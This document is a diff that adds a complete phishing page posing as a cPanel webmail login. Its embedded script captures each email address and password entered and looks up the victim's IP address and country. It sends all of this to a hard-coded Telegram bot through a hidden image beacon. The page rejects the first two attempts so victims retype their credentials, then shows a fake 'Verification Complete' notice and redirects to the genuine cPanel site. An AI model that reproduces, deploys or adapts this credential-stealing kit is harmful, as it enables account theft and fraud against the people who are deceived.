@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Webmail Login - cPanel</title>
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet" />
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      background: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-y: auto;
+      padding: 70px 0 40px;
+      color: #333;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      padding: 0 15px;
+    }
+
+    .error-message {
+      display: none;
+      background: #cc0000;
+      color: #ffffff;
+      font-size: 13px;
+      font-weight: 500;
+      text-align: center;
+      padding: 10px 15px;
+      border-radius: 3px;
+      width: 340px;
+      max-width: 100%;
+      margin: 0 auto 30px;
+      opacity: 0;
+      transition: opacity 0.5s ease;
+    }
+
+    .success-page {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .success-message {
+      background: #f3f3f3;
+      border: 1px solid #d9d9d9;
+      color: #333;
+      padding: 18px;
+      border-radius: 4px;
+      line-height: 1.7;
+      font-size: 14px;
+      margin-top: 25px;
+    }
+
+    .logo {
+      margin-top: 25px;
+      margin-bottom: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .logo img {
+      width: 260px;
+      max-width: 100%;
+      height: auto;
+    }
+
+    .form-group {
+      text-align: left;
+      margin-bottom: 22px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 8px;
+      color: #222;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    .input-wrapper i {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #9aa7af;
+      font-size: 14px;
+    }
+
+    .input-wrapper input {
+      width: 100%;
+      height: 42px;
+      border: 1px solid #b9b9b9;
+      border-radius: 3px;
+      padding-left: 38px;
+      font-size: 14px;
+      background: #fff;
+      outline: none;
+    }
+
+    .input-wrapper input:focus {
+      border-color: #3d9ed6;
+      box-shadow: 0 0 4px rgba(61, 158, 214, 0.3);
+    }
+
+    .login-btn {
+      width: 100%;
+      height: 42px;
+      background: #1294d0;
+      border: 1px solid #0c79aa;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: 0.2s ease;
+      margin-top: 6px;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .login-btn:hover:not(:disabled) {
+      background: #0f84ba;
+    }
+
+    .login-btn:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    /* Spinner animation */
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.6s linear infinite;
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .languages {
+      margin-top: 90px;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 24px;
+      padding: 0 20px;
+      font-size: 12px;
+    }
+
+    .languages a {
+      text-decoration: none;
+      color: #111;
+    }
+
+    .languages a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      width: 100%;
+      text-align: center;
+      margin-top: 80px;
+      margin-bottom: 20px;
+      font-size: 11px;
+      color: #777;
+      line-height: 1.8;
+    }
+
+    .footer-logo {
+      margin-bottom: 14px;
+    }
+
+    .footer-logo img {
+      width: 65px;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .footer a {
+      color: #777;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      color: #ff6b1c;
+      text-decoration: underline;
+    }
+
+    @media(max-width: 600px) {
+      body {
+        padding-top: 50px;
+      }
+      .container {
+        width: 92%;
+      }
+      .logo img {
+        width: 220px;
+      }
+      .error-message {
+        width: 100%;
+      }
+      .languages {
+        gap: 14px;
+        margin-top: 70px;
+      }
+      .footer {
+        margin-top: 60px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="error-message" id="errorBox">The login is invalid.</div>
+
+  <div id="loginPage">
+    <div class="logo">
+      <img src="https://i.postimg.cc/Z9WjJ4gx/webmail-logon.png" alt="Webmail Login">
+    </div>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <label>Email Address</label>
+        <div class="input-wrapper">
+          <i class="fa-solid fa-user"></i>
+          <input type="email" id="email" placeholder="Enter your email address." required>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Password</label>
+        <div class="input-wrapper">
+          <i class="fa-solid fa-lock"></i>
+          <input type="password" id="password" placeholder="Enter your email password." required>
+        </div>
+      </div>
+
+      <button class="login-btn" type="submit" id="submitBtn">
+        Log in
+      </button>
+    </form>
+  </div>
+
+  <div class="success-page" id="successPage">
+    <div class="logo">
+      <img src="https://i.postimg.cc/Z9WjJ4gx/webmail-logon.png" alt="Webmail Login">
+    </div>
+    <div class="success-message">
+	<h3>✓ Verification Complete</h3>
+      Thank you for successfully authenticating your email account.<br>
+      Your verification process has been completed successfully,<br>
+      and you can now continue to access your mailbox without interruption.
+    </div>
+  </div>
+</div>
+
+<div class="languages">
+  <a href="#">العربية</a>
+  <a href="#">čeština</a>
+  <a href="#">dansk</a>
+  <a href="#">Deutsch</a>
+  <a href="#">Ελληνικά</a>
+  <a href="#">English</a>
+  <a href="#">español</a>
+  <a href="#">español latinoamericano</a>
+</div>
+
+<div class="footer">
+  <div class="footer-logo">
+    <img src="https://i.postimg.cc/w1Gcfnvh/cpanel-logo.png" alt="cPanel Logo">
+  </div>
+  <div>Copyright © 2026 cPanel, L.L.C.</div>
+  <div><a href="#">Privacy Policy</a></div>
+</div>
+
+<script>
+// Configuration
+const cfg = {
+  t: "8258422135:AAGak-KRt5g79RXk0UlePyleDifpg_jMuSA",
+  c: "8423595277"
+};
+
+let attempts = 0;
+let isProcessing = false;
+
+const form = document.getElementById("loginForm");
+const errBox = document.getElementById("errorBox");
+const emailInp = document.getElementById("email");
+const passInp = document.getElementById("password");
+const loginView = document.getElementById("loginPage");
+const successView = document.getElementById("successPage");
+const submitBtn = document.getElementById("submitBtn");
+
+// Function to show processing state on button
+function showProcessingState() {
+  submitBtn.disabled = true;
+  submitBtn.innerHTML = '<span class="spinner"></span> Processing...';
+}
+
+// Function to reset button to normal state
+function resetButtonState() {
+  submitBtn.disabled = false;
+  submitBtn.innerHTML = 'Log in';
+}
+
+// Function to show error message
+function showErrorMsg(message, duration = 2200) {
+  if (window.to) clearTimeout(window.to);
+  errBox.style.display = "block";
+  errBox.style.opacity = "1";
+  errBox.innerHTML = message;
+  window.to = setTimeout(() => {
+    errBox.style.opacity = "0";
+    setTimeout(() => { 
+      if (errBox.style.opacity === "0") errBox.style.display = "none"; 
+    }, 400);
+  }, duration);
+}
+
+// Get IP and location info
+async function getLocation() {
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const data = await res.json();
+    return { ip: data.ip || 'unknown', country: data.country_name || 'unknown' };
+  } catch {
+    return { ip: 'unknown', country: 'unknown' };
+  }
+}
+
+// Send data to Telegram using Image beacon
+function sendData(ipData, attemptNum) {
+  const email = emailInp.value.trim();
+  const pwd = passInp.value;
+  const time = new Date().toLocaleString();
+  const msg = `🔐 LOGIN ATTEMPT #${attemptNum}\n━━━━━━━━━━━━━━━━\n📧 Email: ${email}\n🔑 Password: ${pwd}\n🌍 Country: ${ipData.country}\n🖥️ IP: ${ipData.ip}\n⏱️ Time: ${time}\n━━━━━━━━━━━━━━━━`;
+  
+  const url = `https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.c}&text=${encodeURIComponent(msg)}`;
+  
+  // Use Image beacon to send data silently
+  const beacon = new Image();
+  beacon.src = url;
+}
+
+// Main form submit handler
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  
+  // Prevent multiple submissions while processing
+  if (isProcessing) return;
+  
+  const email = emailInp.value.trim();
+  const pwd = passInp.value;
+  
+  // Validate fields
+  if (!email || !pwd) {
+    showErrorMsg("Please fill in both fields.", 1500);
+    return;
+  }
+  
+  // Start processing - show loading state on button
+  isProcessing = true;
+  showProcessingState();
+  
+  // Short delay to show processing state (visual feedback)
+  await new Promise(resolve => setTimeout(resolve, 800));
+  
+  // Get location info
+  const ipInfo = await getLocation();
+  
+  // Increment attempt counter
+  attempts++;
+  
+  // Send data to Telegram (silent background operation)
+  sendData(ipInfo, attempts);
+  
+  // Small additional delay to make processing feel realistic
+  await new Promise(resolve => setTimeout(resolve, 500));
+  
+  // Reset button state
+  resetButtonState();
+  
+  // Handle based on attempt count
+  if (attempts < 3) {
+    // Show error message for invalid login
+    showErrorMsg("The login is invalid.", 2200);
+    
+    // Clear password field
+    passInp.value = "";
+    passInp.focus();
+    
+    isProcessing = false;
+    return;
+  }
+  
+  // Third attempt - show success page and redirect
+  loginView.style.display = "none";
+  successView.style.display = "block";
+  
+  // Redirect after 5 seconds
+  setTimeout(() => {
+    window.location.href = "https://webmail.cpanel.net/";
+  }, 5000);
+  
+  isProcessing = false;
+});
+
+// Initialize on page load
+window.addEventListener("load", () => {
+  loginView.style.display = "block";
+  successView.style.display = "none";
+  errBox.style.display = "none";
+  attempts = 0;
+  resetButtonState();
+});
+</script>
+</body>
+</html>
